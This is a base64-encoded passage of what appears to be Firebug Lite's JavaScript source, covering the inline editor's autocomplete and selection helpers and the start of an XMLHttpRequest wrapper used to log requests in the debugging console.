FydCk7DQoNCiAgICAgICAgICAgIC8vIEZpbmQgdGhlIHBhcnQgb2YgdGhlIHN0cmluZyB0aGF0IGlzIGJlaW5nIGNvbXBsZXRlZA0KICAgICAgICAgICAgdmFyIHJhbmdlID0gZ2V0UmFuZ2UgPyBnZXRSYW5nZShwYXJzZWQsIG9mZnNldC1wYXJzZVN0YXJ0LCBjb250ZXh0KSA6IG51bGw7DQogICAgICAgICAgICBpZiAoIXJhbmdlKQ0KICAgICAgICAgICAgICAgIHJhbmdlID0ge3N0YXJ0OiAwLCBlbmQ6IHBhcnNlZC5sZW5ndGgtMSB9Ow0KDQogICAgICAgICAgICB2YXIgZXhwciA9IHBhcnNlZC5zdWJzdHIocmFuZ2Uuc3RhcnQsIHJhbmdlLmVuZC1yYW5nZS5zdGFydCsxKTsNCiAgICAgICAgICAgIHByZUV4cHIgPSBwYXJzZWQuc3Vic3RyKDAsIHJhbmdlLnN0YXJ0KTsNCiAgICAgICAgICAgIHBvc3RFeHByID0gcGFyc2VkLnN1YnN0cihyYW5nZS5lbmQrMSk7DQogICAgICAgICAgICBleHByT2Zmc2V0ID0gcGFyc2VTdGFydCArIHJhbmdlLnN0YXJ0Ow0KDQogICAgICAgICAgICBpZiAoIWN5Y2xlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICghZXhwcikNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKGxhc3RFeHByICYmIGxhc3RFeHByLmluZGV4T2YoZXhwcikgIT0gMCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNhbmRpZGF0ZXMgPSBudWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIGlmIChsYXN0RXhwciAmJiBsYXN0RXhwci5sZW5ndGggPj0gZXhwci5sZW5ndGgpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjYW5kaWRhdGVzID0gbnVsbDsNCiAgICAgICAgICAgICAgICAgICAgbGFzdEV4cHIgPSBleHByOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBsYXN0RXhwciA9IGV4cHI7DQogICAgICAgICAgICBsYXN0T2Zmc2V0ID0gb2Zmc2V0Ow0KDQogICAgICAgICAgICB2YXIgc2VhcmNoRXhwcjsNCg0KICAgICAgICAgICAgLy8gQ2hlY2sgaWYgdGhlIGN1cnNvciBpcyBhdCB0aGUgdmVyeSByaWdodCBlZGdlIG9mIHRoZSBleHByZXNzaW9uLCBvcg0KICAgICAgICAgICAgLy8gc29tZXdoZXJlIGluIHRoZSBtaWRkbGUgb2YgaXQNCiAgICAgICAgICAgIGlmIChleHByICYmIG9mZnNldCAhPSBwYXJzZVN0YXJ0K3JhbmdlLmVuZCsxKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChjeWNsZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIC8vIFdlIGFyZSBpbiB0aGUgbWlkZGxlIG9mIHRoZSBleHByZXNzaW9uLCBidXQgd2UgY2FuDQogICAgICAgICAgICAgICAgICAgIC8vIGNvbXBsZXRlIGJ5IGN5Y2xpbmcgdG8gdGhlIG5leHQgaXRlbSBpbiB0aGUgdmFsdWVzDQogICAgICAgICAgICAgICAgICAgIC8vIGxpc3QgYWZ0ZXIgdGhlIGV4cHJlc3Npb24NCiAgICAgICAgICAgICAgICAgICAgb2Zmc2V0ID0gcmFuZ2Uuc3RhcnQ7DQogICAgICAgICAgICAgICAgICAgIHNlYXJjaEV4cHIgPSBleHByOw0KICAgICAgICAgICAgICAgICAgICBleHByID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIC8vIFdlIGNhbid0IGNvbXBsZXRlIHVubGVzcyB3ZSBhcmUgYXQgdGhlIHJpZGdlIGVkZ2UNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgdmFyIHZhbHVlcyA9IGV2YWx1YXRvcihwcmVFeHByLCBleHByLCBwb3N0RXhwciwgY29udGV4dCk7DQogICAgICAgICAgICBpZiAoIXZhbHVlcykNCiAgICAgICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgICAgIGlmIChleHByKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIEZpbHRlciB0aGUgbGlzdCBvZiB2YWx1ZXMgdG8gdGhvc2Ugd2hpY2ggYmVnaW4gd2l0aCBleHByLiBXZQ0KICAgICAgICAgICAgICAgIC8vIHdpbGwgdGhlbiBnbyBvbiB0byBjb21wbGV0ZSB0aGUgZmlyc3QgdmFsdWUgaW4gdGhlIHJlc3VsdGluZyBsaXN0DQogICAgICAgICAgICAgICAgY2FuZGlkYXRlcyA9IFtdOw0KDQogICAgICAgICAgICAgICAgaWYgKGNhc2VTZW5zaXRpdmUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHZhbHVlcy5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG5hbWUgPSB2YWx1ZXNbaV07DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAobmFtZS5pbmRleE9mICYmIG5hbWUuaW5kZXhPZihleHByKSA9PSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbmRpZGF0ZXMucHVzaChuYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgbG93ZXJFeHByID0gY2FzZVNlbnNpdGl2ZSA/IGV4cHIgOiBleHByLnRvTG93ZXJDYXNlKCk7DQogICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdmFsdWVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgbmFtZSA9IHZhbHVlc1tpXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChuYW1lLmluZGV4T2YgJiYgbmFtZS50b0xvd2VyQ2FzZSgpLmluZGV4T2YobG93ZXJFeHByKSA9PSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbmRpZGF0ZXMucHVzaChuYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGxhc3RJbmRleCA9IHJldmVyc2UgPyBjYW5kaWRhdGVzLmxlbmd0aC0xIDogMDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKHNlYXJjaEV4cHIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHNlYXJjaEluZGV4ID0gLTE7DQoNCiAgICAgICAgICAgICAgICAvLyBGaW5kIHRoZSBmaXJzdCBpbnN0YW5jZSBvZiBzZWFyY2hFeHByIGluIHRoZSB2YWx1ZXMgbGlzdC4gV2UNCiAgICAgICAgICAgICAgICAvLyB3aWxsIHRoZW4gY29tcGxldGUgdGhlIHN0cmluZyB0aGF0IGlzIGZvdW5kDQogICAgICAgICAgICAgICAgaWYgKGNhc2VTZW5zaXRpdmUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzZWFyY2hJbmRleCA9IHZhbHVlcy5pbmRleE9mKGV4cHIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgbG93ZXJFeHByID0gc2VhcmNoRXhwci50b0xvd2VyQ2FzZSgpOw0KICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHZhbHVlcy5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG5hbWUgPSB2YWx1ZXNbaV07DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAobmFtZSAmJiBuYW1lLnRvTG93ZXJDYXNlKCkuaW5kZXhPZihsb3dlckV4cHIpID09IDApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VhcmNoSW5kZXggPSBpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgLy8gTm90aGluZyBmb3VuZCwgc28gdGhlcmUncyBub3RoaW5nIHRvIGNvbXBsZXRlIHRvDQogICAgICAgICAgICAgICAgaWYgKHNlYXJjaEluZGV4ID09IC0xKQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5yZXNldCgpOw0KDQogICAgICAgICAgICAgICAgZXhwciA9IHNlYXJjaEV4cHI7DQogICAgICAgICAgICAgICAgY2FuZGlkYXRlcyA9IGNsb25lQXJyYXkodmFsdWVzKTsNCiAgICAgICAgICAgICAgICBsYXN0SW5kZXggPSBzZWFyY2hJbmRleDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBleHByID0gIiI7DQogICAgICAgICAgICAgICAgY2FuZGlkYXRlcyA9IFtdOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdmFsdWVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHZhbHVlc1tpXS5zdWJzdHIpDQogICAgICAgICAgICAgICAgICAgICAgICBjYW5kaWRhdGVzLnB1c2godmFsdWVzW2ldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgbGFzdEluZGV4ID0gLTE7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoY3ljbGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGV4cHIgPSBsYXN0RXhwcjsNCiAgICAgICAgICAgIGxhc3RJbmRleCArPSByZXZlcnNlID8gLTEgOiAxOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCFjYW5kaWRhdGVzLmxlbmd0aCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBpZiAobGFzdEluZGV4ID49IGNhbmRpZGF0ZXMubGVuZ3RoKQ0KICAgICAgICAgICAgbGFzdEluZGV4ID0gMDsNCiAgICAgICAgZWxzZSBpZiAobGFzdEluZGV4IDwgMCkNCiAgICAgICAgICAgIGxhc3RJbmRleCA9IGNhbmRpZGF0ZXMubGVuZ3RoLTE7DQoNCiAgICAgICAgdmFyIGNvbXBsZXRpb24gPSBjYW5kaWRhdGVzW2xhc3RJbmRleF07DQogICAgICAgIHZhciBwcmVDb21wbGV0aW9uID0gZXhwci5zdWJzdHIoMCwgb2Zmc2V0LWV4cHJPZmZzZXQpOw0KICAgICAgICB2YXIgcG9zdENvbXBsZXRpb24gPSBjb21wbGV0aW9uLnN1YnN0cihvZmZzZXQtZXhwck9mZnNldCk7DQoNCiAgICAgICAgdGV4dEJveC52YWx1ZSA9IHByZVBhcnNlZCArIHByZUV4cHIgKyBwcmVDb21wbGV0aW9uICsgcG9zdENvbXBsZXRpb24gKyBwb3N0RXhwcjsNCiAgICAgICAgdmFyIG9mZnNldEVuZCA9IHByZVBhcnNlZC5sZW5ndGggKyBwcmVFeHByLmxlbmd0aCArIGNvbXBsZXRpb24ubGVuZ3RoOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gcmVtb3ZlIHRoZSBmb2xsb3dpbmcgY29tbWVudGVkIGNvZGUsIGlmIHRoZSBsaWIuc2V0U2VsZWN0aW9uUmFuZ2UoKQ0KICAgICAgICAvLyBpcyB3b3JraW5nIHdlbGwuDQogICAgICAgIC8qDQogICAgICAgIGlmICh0ZXh0Qm94LnNldFNlbGVjdGlvblJhbmdlKQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyB3ZSBtdXN0IHNlbGVjdCB0aGUgcmFuZ2Ugd2l0aCBhIHRpbWVvdXQsIG90aGVyd2lzZSB0aGUgdGV4dCB3b24ndA0KICAgICAgICAgICAgLy8gYmUgcHJvcGVybHkgc2VsZWN0ZWQgKGJlY2F1c2UgYWZ0ZXIgdGhpcyBmdW5jdGlvbiBleGVjdXRlcywgdGhlIGVkaXRvcidzDQogICAgICAgICAgICAvLyBpbnB1dCB3aWxsIGJlIHJlc2l6ZWQgdG8gZml0IHRoZSB3aG9sZSB0ZXh0KQ0KICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpew0KICAgICAgICAgICAgICAgIGlmIChzZWxlY3RNb2RlKQ0KICAgICAgICAgICAgICAgICAgICB0ZXh0Qm94LnNldFNlbGVjdGlvblJhbmdlKG9mZnNldCwgb2Zmc2V0RW5kKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHRleHRCb3guc2V0U2VsZWN0aW9uUmFuZ2Uob2Zmc2V0RW5kLCBvZmZzZXRFbmQpOw0KICAgICAgICAgICAgfSwwKTsNCiAgICAgICAgfQ0KICAgICAgICAvKiovDQogICAgICAgIA0KICAgICAgICAvLyB3ZSBtdXN0IHNlbGVjdCB0aGUgcmFuZ2Ugd2l0aCBhIHRpbWVvdXQsIG90aGVyd2lzZSB0aGUgdGV4dCB3b24ndA0KICAgICAgICAvLyBiZSBwcm9wZXJseSBzZWxlY3RlZCAoYmVjYXVzZSBhZnRlciB0aGlzIGZ1bmN0aW9uIGV4ZWN1dGVzLCB0aGUgZWRpdG9yJ3MNCiAgICAgICAgLy8gaW5wdXQgd2lsbCBiZSByZXNpemVkIHRvIGZpdCB0aGUgd2hvbGUgdGV4dCkNCiAgICAgICAgLyoNCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpew0KICAgICAgICAgICAgaWYgKHNlbGVjdE1vZGUpDQogICAgICAgICAgICAgICAgc2V0U2VsZWN0aW9uUmFuZ2UodGV4dEJveCwgb2Zmc2V0LCBvZmZzZXRFbmQpOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHNldFNlbGVjdGlvblJhbmdlKHRleHRCb3gsIG9mZnNldEVuZCwgb2Zmc2V0RW5kKTsNCiAgICAgICAgfSwwKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIC8qKi8NCiAgICAgICAgDQogICAgICAgIC8vIFRoZSBlZGl0b3IgdGV4dCBzaG91bGQgYmUgc2VsZWN0ZWQgb25seSBhZnRlciBjYWxsaW5nIHRoZSBlZGl0b3IudXBkYXRlKCkgDQogICAgICAgIC8vIGluIFNhZmFyaS9DaHJvbWUsIG90aGVyd2lzZSB0aGUgdGV4dCB3b24ndCBiZSBzZWxlY3RlZC4gU28sIHdlJ3JlIHJldHVybmluZw0KICAgICAgICAvLyBhIGZ1bmN0aW9uIHRvIGJlIGNhbGxlZCBsYXRlciAoaW4gdGhlIHByb3BlciB0aW1lIGZvciBhbGwgYnJvd3NlcnMpLg0KICAgICAgICAvLw0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBzZWUgaWYgd2UgY2FuIG1vdmUgdGhlIGVkaXRvci51cGRhdGUoKSBjYWxscyB0byBoZXJlLCBhbmQgYXZvaWQNCiAgICAgICAgLy8gcmV0dXJuaW5nIGEgY2xvc3VyZS4gdGhlIGNvbXBsZXRlKCkgZnVuY3Rpb24gc2VlbXMgdG8gYmUgY2FsbGVkIG9ubHkgdHdpY2UgaW4NCiAgICAgICAgLy8gZWRpdG9yLmpzLiBTZWUgaWYgdGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgYW55d2hlcmUgZWxzZSAobGlrZSBjc3MuanMgZm9yIGV4YW1wbGUpLg0KICAgICAgICByZXR1cm4gZnVuY3Rpb24oKXsNCiAgICAgICAgICAgIC8vY29uc29sZS5sb2coImF1dG9jb21wbGV0ZSAiLCB0ZXh0Qm94LCBvZmZzZXQsIG9mZnNldEVuZCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChzZWxlY3RNb2RlKQ0KICAgICAgICAgICAgICAgIHNldFNlbGVjdGlvblJhbmdlKHRleHRCb3gsIG9mZnNldCwgb2Zmc2V0RW5kKTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBzZXRTZWxlY3Rpb25SYW5nZSh0ZXh0Qm94LCBvZmZzZXRFbmQsIG9mZnNldEVuZCk7DQogICAgICAgIH07DQogICAgICAgIC8qKi8NCiAgICB9Ow0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBMb2NhbCBIZWxwZXJzDQoNCnZhciBnZXREZWZhdWx0RWRpdG9yID0gZnVuY3Rpb24gZ2V0RGVmYXVsdEVkaXRvcihwYW5lbCkNCnsNCiAgICBpZiAoIWRlZmF1bHRFZGl0b3IpDQogICAgew0KICAgICAgICB2YXIgZG9jID0gcGFuZWwuZG9jdW1lbnQ7DQogICAgICAgIGRlZmF1bHRFZGl0b3IgPSBuZXcgRmlyZWJ1Zy5JbmxpbmVFZGl0b3IoZG9jKTsNCiAgICB9DQoNCiAgICByZXR1cm4gZGVmYXVsdEVkaXRvcjsNCn0NCg0KLyoqDQogKiBBbiBvdXRzaWRlciBpcyB0aGUgZmlyc3QgZWxlbWVudCBtYXRjaGluZyB0aGUgc3RlcHBlciBlbGVtZW50IHRoYXQNCiAqIGlzIG5vdCBhbiBjaGlsZCBvZiBncm91cC4gRWxlbWVudHMgdGFnZ2VkIHdpdGggaW5zZXJ0QmVmb3JlIG9yIGluc2VydEFmdGVyDQogKiBjbGFzc2VzIGFyZSBhbHNvIGV4Y2x1ZGVkIGZyb20gdGhlc2UgcmVzdWx0cyB1bmxlc3MgdGhleSBhcmUgdGhlIHNpYmxpbmcNCiAqIG9mIGdyb3VwLCByZWxhdGl2ZSB0byBncm91cCdzIHBhcmVudCBlZGl0R3JvdXAuIFRoaXMgYWxsb3dzIGZvciB0aGUgcHJvcGVyIGluc2VydGlvbg0KICogcm93cyB3aGVuIGdyb3VwcyBhcmUgbmVzdGVkLg0KICovDQp2YXIgZ2V0T3V0c2lkZXIgPSBmdW5jdGlvbiBnZXRPdXRzaWRlcihlbGVtZW50LCBncm91cCwgc3RlcHBlcikNCnsNCiAgICB2YXIgcGFyZW50R3JvdXAgPSBnZXRBbmNlc3RvckJ5Q2xhc3MoZ3JvdXAucGFyZW50Tm9kZSwgImVkaXRHcm91cCIpOw0KICAgIHZhciBuZXh0Ow0KICAgIGRvDQogICAgew0KICAgICAgICBuZXh0ID0gc3RlcHBlcihuZXh0IHx8IGVsZW1lbnQpOw0KICAgIH0NCiAgICB3aGlsZSAoaXNBbmNlc3RvcihuZXh0LCBncm91cCkgfHwgaXNHcm91cEluc2VydChuZXh0LCBwYXJlbnRHcm91cCkpOw0KDQogICAgcmV0dXJuIG5leHQ7DQp9DQoNCnZhciBpc0dyb3VwSW5zZXJ0ID0gZnVuY3Rpb24gaXNHcm91cEluc2VydChuZXh0LCBncm91cCkNCnsNCiAgICByZXR1cm4gKCFncm91cCB8fCBpc0FuY2VzdG9yKG5leHQsIGdyb3VwKSkNCiAgICAgICAgJiYgKGhhc0NsYXNzKG5leHQsICJpbnNlcnRCZWZvcmUiKSB8fCBoYXNDbGFzcyhuZXh0LCAiaW5zZXJ0QWZ0ZXIiKSk7DQp9DQoNCnZhciBnZXROZXh0T3V0c2lkZXIgPSBmdW5jdGlvbiBnZXROZXh0T3V0c2lkZXIoZWxlbWVudCwgZ3JvdXApDQp7DQogICAgcmV0dXJuIGdldE91dHNpZGVyKGVsZW1lbnQsIGdyb3VwLCBiaW5kKGdldE5leHRCeUNsYXNzLCBGQkwsICJlZGl0YWJsZSIpKTsNCn0NCg0KdmFyIGdldFByZXZpb3VzT3V0c2lkZXIgPSBmdW5jdGlvbiBnZXRQcmV2aW91c091dHNpZGVyKGVsZW1lbnQsIGdyb3VwKQ0Kew0KICAgIHJldHVybiBnZXRPdXRzaWRlcihlbGVtZW50LCBncm91cCwgYmluZChnZXRQcmV2aW91c0J5Q2xhc3MsIEZCTCwgImVkaXRhYmxlIikpOw0KfQ0KDQp2YXIgZ2V0SW5saW5lUGFyZW50ID0gZnVuY3Rpb24gZ2V0SW5saW5lUGFyZW50KGVsZW1lbnQpDQp7DQogICAgdmFyIGxhc3RJbmxpbmUgPSBlbGVtZW50Ow0KICAgIGZvciAoOyBlbGVtZW50OyBlbGVtZW50ID0gZWxlbWVudC5wYXJlbnROb2RlKQ0KICAgIHsNCiAgICAgICAgLy92YXIgcyA9IGVsZW1lbnQub3duZXJEb2N1bWVudC5kZWZhdWx0Vmlldy5nZXRDb21wdXRlZFN0eWxlKGVsZW1lbnQsICIiKTsNCiAgICAgICAgdmFyIHMgPSBpc0lFID8NCiAgICAgICAgICAgICAgICBlbGVtZW50LmN1cnJlbnRTdHlsZSA6DQogICAgICAgICAgICAgICAgZWxlbWVudC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3LmdldENvbXB1dGVkU3R5bGUoZWxlbWVudCwgIiIpOw0KICAgICAgICANCiAgICAgICAgaWYgKHMuZGlzcGxheSAhPSAiaW5saW5lIikNCiAgICAgICAgICAgIHJldHVybiBsYXN0SW5saW5lOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICBsYXN0SW5saW5lID0gZWxlbWVudDsNCiAgICB9DQogICAgcmV0dXJuIG51bGw7DQp9DQoNCnZhciBpbnNlcnRUYWIgPSBmdW5jdGlvbiBpbnNlcnRUYWIoKQ0Kew0KICAgIGluc2VydFRleHRJbnRvRWxlbWVudChjdXJyZW50RWRpdG9yLmlucHV0LCBGaXJlYnVnLkVkaXRvci50YWJDaGFyYWN0ZXIpOw0KfQ0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRmlyZWJ1Zy5yZWdpc3Rlck1vZHVsZShGaXJlYnVnLkVkaXRvcik7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp9fSk7DQoNCg0KLyogU2VlIGxpY2Vuc2UudHh0IGZvciB0ZXJtcyBvZiB1c2FnZSAqLw0KDQpGQkwubnMoZnVuY3Rpb24oKSB7IHdpdGggKEZCTCkgew0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCmlmIChFbnYuT3B0aW9ucy5kaXNhYmxlWEhSTGlzdGVuZXIpDQogICAgcmV0dXJuOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFhIUlNweQ0KICAgIA0KdmFyIFhIUlNweSA9IGZ1bmN0aW9uKCkNCnsNCiAgICB0aGlzLnJlcXVlc3RIZWFkZXJzID0gW107DQogICAgdGhpcy5yZXNwb25zZUhlYWRlcnMgPSBbXTsNCn07DQoNClhIUlNweS5wcm90b3R5cGUgPSANCnsNCiAgICBtZXRob2Q6IG51bGwsDQogICAgdXJsOiBudWxsLA0KICAgIGFzeW5jOiBudWxsLA0KICAgIA0KICAgIHhoclJlcXVlc3Q6IG51bGwsDQogICAgDQogICAgaHJlZjogbnVsbCwNCiAgICANCiAgICBsb2FkZWQ6IGZhbHNlLA0KICAgIA0KICAgIGxvZ1JvdzogbnVsbCwNCiAgICANCiAgICByZXNwb25zZVRleHQ6IG51bGwsDQogICAgDQogICAgcmVxdWVzdEhlYWRlcnM6IG51bGwsDQogICAgcmVzcG9uc2VIZWFkZXJzOiBudWxsLA0KICAgIA0KICAgIHNvdXJjZUxpbms6IG51bGwsIC8vIHtocmVmOiJmaWxlLmh0bWwiLCBsaW5lOiAyMn0NCiAgICANCiAgICBnZXRVUkw6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLmhyZWY7DQogICAgfQ0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBYTUxIdHRwUmVxdWVzdFdyYXBwZXINCg0KdmFyIFhNTEh0dHBSZXF1ZXN0V3JhcHBlciA9IGZ1bmN0aW9uKGFjdGl2ZVhPYmplY3QpDQp7DQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIFhNTEh0dHBSZXF1ZXN0V3JhcHBlciBpbnRlcm5hbCB2YXJpYWJsZXMNCiAgICANCiAgICB2YXIgeGhyUmVxdWVzdCA9IHR5cGVvZiBhY3RpdmVYT2JqZWN0ICE9ICJ1bmRlZmluZWQiID8NCiAgICAgICAgICAgICAgICBhY3RpdmVYT2JqZWN0IDoNCiAgICAgICAgICAgICAgICBuZXcgX1hNTEh0dHBSZXF1ZXN0KCksDQogICAgICAgIA0KICAgICAgICBzcHkgPSBuZXcgWEhSU3B5KCksDQogICAgICAgIA0KICAgICAgICBzZWxmID0gdGhpcywNCiAgICAgICAgDQogICAgICAgIHJlcVR5cGUsDQogICAgICAgIHJlcVVybCwNCiAgICAgICAgcmVxU3RhcnRUUzsNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBYTUxIdHRwUmVxdWVzdFdyYXBwZXIgaW50ZXJuYWwgbWV0aG9kcw0KICAgIA0KICAgIHZhciB1cGRhdGVTZWxmUHJvcGVydGllc0lnbm9yZSA9IHsNCiAgICAgICAgYWJvcnQ6IDEsDQogICAgICAgIGNoYW5uZWw6IDEsDQogICAgICAgIGdldEFsbFJlc3BvbnNlSGVhZGVyczogMSwNCiAgICAgICAgZ2V0SW50ZXJmYWNlOiAxLA0KICAgICAgICBnZXRSZXNwb25zZUhlYWRlcjogMSwNCiAgICAgICAgbW96QmFja2dyb3VuZFJlcXVlc3Q6IDEsDQogICAgICAgIG11bHRpcGFydDogMSwNCiAgICAgICAgb25yZWFkeXN0YXRlY2hhbmdlOiAxLA0KICAgICAgICBvcGVuOiAxLA0KICAgICAgICBzZW5kOiAxLA0KICAgICAgICBzZXRSZXF1ZXN0SGVhZGVyOiAxDQogICAgfTsNCiAgICANCiAgICB2YXIgdXBkYXRlU2VsZlByb3BlcnRpZXMgPSBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoc3VwcG9ydHNYSFJJdGVyYXRvcikNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgcHJvcE5hbWUgaW4geGhyUmVxdWVzdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAocHJvcE5hbWUgaW4gdXBkYXRlU2VsZlByb3BlcnRpZXNJZ25vcmUpDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHByb3BWYWx1ZSA9IHhoclJlcXVlc3RbcHJvcE5hbWVdOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgKHByb3BWYWx1ZSAmJiAhaXNGdW5jdGlvbihwcm9wVmFsdWUpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZltwcm9wTmFtZV0gPSBwcm9wVmFsdWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoKEUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAvL2NvbnNvbGUubG9nKHByb3BOYW1lLCBFLm1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIHdpbGwgZmFpbCB0byByZWFkIHRoZXNlIHhoclJlcXVlc3QgcHJvcGVydGllcyBpZiB0aGUgcmVxdWVzdCBpcyBub3QgY29tcGxldGVkDQogICAgICAgICAgICBpZiAoeGhyUmVxdWVzdC5yZWFkeVN0YXRlID09ID